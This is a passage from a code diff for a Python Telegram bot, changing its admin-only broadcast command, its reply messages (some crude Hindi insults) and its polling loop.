-        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒"
-    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
@@ -360,32 +419,27 @@ def broadcast_message(message):
     if user_id in admin_id:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐅𝐑𝐎𝐌 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐄𝐑:\n\n" + command[1]
-            for uid in users:
-                try:
-                    bot.send_message(uid, message_to_broadcast)
-                except Exception as e:
-                    print(f"Failed to send broadcast message to user {uid}: {str(e)}")
-            response = "Broadcast message sent successfully to all users 👍."
+            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                for user_id in user_ids:
+                    try:
+                        bot.send_message(user_id, message_to_broadcast)
+                    except Exception as e:
+                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
+            response = "Broadcast Message Sent Successfully To All Users ."
         else:
-            response = "𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐓𝐎 𝐋𝐈𝐊𝐇𝐃𝐄 𝐆𝐀𝐍𝐃𝐔"
+            response = " Please Provide A Message To Broadcast."
     else:
-        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃"
+        response = "BhenChod Owner na HAI TU LODE."
+
     bot.reply_to(message, response)
 
-# New function to print system status every 170 seconds
-def periodic_print():
-    while True:
-        time.sleep(170)
-        print("System status: Running at", datetime.datetime.now())
 
-if __name__ == "__main__":
-    load_data()
-    # Start the periodic print in a separate daemon thread
-    threading.Thread(target=periodic_print, daemon=True).start()
-    while True:
-        try:
-            bot.polling(none_stop=True)
-        except Exception as e:
-            print(e)
-            time.sleep(15)
+
+#bot.polling()
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
